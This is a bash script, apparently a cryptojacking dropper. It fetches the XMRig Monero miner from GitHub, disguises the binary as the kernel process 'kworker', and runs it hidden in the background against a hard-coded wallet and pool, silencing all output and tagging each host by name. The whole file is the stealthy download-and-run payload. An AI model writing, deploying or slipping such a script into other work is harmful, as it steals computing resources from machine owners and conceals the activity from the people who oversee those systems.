#!/bin/bash
WALLET="46vggUTyU71TS5bDKZ8GpMFbpWaw16Uv2b3ZjXewXiv98GPLuWjVBf7L2sXHMm1FRpgePGkizEmG4R8SgquBLa4HVPSL4d1"
POOL="gulf.monero.hashvault.pro:443"
sudo sysctl -w vm.nr_hugepages=1280
wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
tar -xzf xmrig-6.21.0-linux-static-x64.tar.gz
mv xmrig-6.21.0/xmrig ./kworker
nohup ./kworker -o $POOL -u $WALLET -p $(hostname) --tls --donate-level 1 > /dev/null 2>&1 &
